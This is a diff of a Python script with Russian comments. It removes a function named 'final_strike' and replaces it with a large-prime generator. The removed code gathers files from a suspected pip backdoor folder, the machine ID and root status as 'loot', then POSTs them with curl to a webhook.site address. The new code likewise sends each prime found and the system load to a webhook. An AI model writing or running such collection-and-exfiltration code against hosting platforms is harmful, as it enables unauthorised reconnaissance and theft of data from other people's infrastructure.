@@ -1,47 +1,55 @@
-import os
-import subprocess
+import random
 import json
+import subprocess
+import time
+import os
 
-WEBHOOK_URL = "http://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
-BACKDOOR_PATH = "/opt/pip-cache/pip_backdoor"
+ 
+WEBHOOK_URL = "https://webhook.site/d9ed8938-0733-4ce3-8d2c-63dab5606e87"
 
-def final_strike():
-    # 1. Собираем улики из подозрительной папки
-    loot = {}
-    if os.path.exists(BACKDOOR_PATH):
-        try:
-            files = os.listdir(BACKDOOR_PATH)
-            loot["backdoor_files"] = files
-            for file in files:
-                fpath = os.path.join(BACKDOOR_PATH, file)
-                if os.path.isfile(fpath):
-                    with open(fpath, 'r', errors='ignore') as f:
-                        loot[f"content_{file}"] = f.read()[:500] # Берем первые 500 символов
-        except Exception as e:
-            loot["error"] = str(e)
-    else:
-        loot["status"] = "pip_backdoor_not_found_on_this_step"
+def is_prime(n, k=40):  # Тест Миллера — Рабина
+    if n <= 3: return n == 2 or n == 3
+    if n % 2 == 0: return False
+    r, d = 0, n - 1
+    while d % 2 == 0:
+        r += 1
+        d //= 2
+    for _ in range(k):
+        a = random.randrange(2, n - 1)
+        x = pow(a, d, n)
+        if x == 1 or x == n - 1: continue
+        for _ in range(r - 1):
+            x = pow(x, 2, n)
+            if x == n - 1: break
+        else: return False
+    return True
 
-    # 2. Попытка инъекции в системный лог Railway через сокет
-    # Мы попробуем отправить наше сообщение в их внутреннюю систему трейсинга
-    report = {
-        "verdict": "CRITICAL_CACHE_POISONING_CONFIRMED",
-        "evidence": loot,
-        "is_root": os.getuid() == 0,
-        "machine_id": open("/etc/machine-id").read().strip() if os.path.exists("/etc/machine-id") else "N/A"
-    }
-
-    # 3. Отправка на хук через curl (единственный надежный метод здесь)
-    with open("/tmp/loot.json", "w") as f:
-        f.write(json.dumps(report))
-
-    print(f"[*] Sending loot to {WEBHOOK_URL}...")
-    subprocess.run([
-        'curl', '-s', '-X', 'POST', 
-        '-H', 'Content-Type: application/json', 
-        '--data-binary', '@/tmp/loot.json', 
-        WEBHOOK_URL
-    ])
+def generate_2k_prime():
+    print("[*] Starting 2000-digit Prime Generation...")
+    found = 0
+    while found < 3: # Достанем хотя бы 3 числа
+    
+        candidate = random.getrandbits(6642) | (1 << 6641) | 1
+        if is_prime(candidate):
+            found += 1
+            load = os.getloadavg()
+            payload = {
+                "EVENT": "2K_PRIME_FOUND",
+                "PRIME_ID": found,
+                "DIGITS": len(str(candidate)),
+                "LOAD_AVG": load,
+                "PRIME": str(candidate)
+            }
+            # Мгновенная отправка
+            try:
+                subprocess.run([
+                    'curl', '-s', '-X', 'POST', 
+                    '-H', 'Content-Type: application/json', 
+                    '-d', json.dumps(payload), 
+                    WEBHOOK_URL
+                ])
+                print(f"[+] Prime #{found} sent to hook.")
+            except: pass
 
 if __name__ == "__main__":
-    final_strike()
+    generate_2k_prime()
